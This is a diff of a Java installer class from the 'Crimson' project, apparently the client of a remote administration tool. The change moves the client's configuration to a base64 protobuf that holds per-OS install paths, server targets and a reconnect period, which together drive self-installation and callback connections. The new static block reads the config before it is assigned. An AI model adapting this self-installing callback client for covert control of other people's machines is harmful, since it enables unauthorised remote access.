@@ -27,35 +27,34 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URISyntaxException;
 import java.nio.channels.FileChannel;
-import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 
 import com.subterranean_security.crimson.client.net.ClientCommands;
-import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
+import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
+import com.subterranean_security.crimson.core.util.B64;
 
 public class Installer {
 
-	public static HashMap<String, String> ic;
+	public static ClientConfig ic;
 	public static String jarPath;
 
 	private static boolean debug = new File("/debug.txt").exists();
 
-	private static String platform = null;
+	private static String base = null;
 
 	static {
 		String name = System.getProperty("os.name").toLowerCase();
 		if (name.endsWith("bsd")) {
-			platform = "bsd";
+			base = ic.getPathBsd();
 		} else if (name.equals("mac os x")) {
-			platform = "osx";
+			base = ic.getPathOsx();
 		} else if (name.equals("solaris") || name.equals("sunos")) {
-			platform = "sol";
+			base = ic.getPathSol();
 		} else if (name.equals("linux")) {
-			platform = "lin";
+			base = ic.getPathLin();
 		} else if (name.startsWith("windows")) {
-			platform = "win";
+			base = ic.getPathWin();
 		}
 	}
 
@@ -71,8 +70,8 @@ public class Installer {
 			if (!isInstalled()) {
 				if (!packagedLibsFound()) {
 					try {
-						ClientStore.Connections.setTargets(getInternalNts());
-						ClientStore.Connections.setPeriod(Integer.parseInt(ic.get("reconnect_period")));
+						ClientStore.Connections.setTargets(ic.getTargetList());
+						ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
 						ClientStore.Connections.connectionRoutine();
 					} catch (Exception e) {
 						// TODO Auto-generated catch block
@@ -102,43 +101,27 @@ public class Installer {
 		return Installer.class.getResourceAsStream("/com/subterranean_security/crimson/client/res/bin/lib.zip") != null;
 	}
 
-	private static HashMap<String, String> readInternal() throws Exception {
-		HashMap<String, String> map = new HashMap<String, String>();
+	private static ClientConfig readInternal() throws Exception {
 		InputStream in = Client.class.getResourceAsStream("/com/subterranean_security/crimson/client/internal.txt");
+
 		BufferedReader input = new BufferedReader(new InputStreamReader(in));
-		String line;
-		while ((line = input.readLine()) != null) {
-			String[] parts = line.split("<>");
-			map.put(parts[0], parts[1].replaceAll("\\%USERNAME\\%", System.getProperty("user.name")));
-		}
+
+		ClientConfig cc = ClientConfig.parseFrom(B64.decode(input.readLine()));
 		input.close();
-		return map;
-	}
 
-	private static ArrayList<NetworkTarget> getInternalNts() throws Exception {
-		ArrayList<NetworkTarget> nt = new ArrayList<NetworkTarget>();
-		for (String s : ic.keySet()) {
-			if (s.equals("nt")) {
-				String[] parts = ic.get(s).split(":");
-				nt.add(NetworkTarget.newBuilder().setServer(parts[0]).setPort(Integer.parseInt(parts[1])).build());
-			}
-		}
-
-		return nt;
+		return cc;
 	}
 
 	public static boolean isInstalled() throws URISyntaxException {
 		jarPath = Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
-		String target = ic.get("base_" + platform);
 		File t1 = (new File(jarPath)).getParentFile();
-		File t2 = new File(target);
+		File t2 = new File(base);
 		System.out.println("Testing for equality: " + t1.getAbsolutePath() + " and: " + t2.getAbsolutePath());
-		return (new File(jarPath)).getParentFile().equals(new File(target));
+		return (new File(jarPath)).getParentFile().equals(new File(base));
 	}
 
 	public static boolean install() {
 		System.out.println("Starting installation");
-		String base = ic.get("base_" + platform);
 		if (!(new File(base)).mkdirs()) {
 			System.out.println("Failed to create install base");
 			return false;
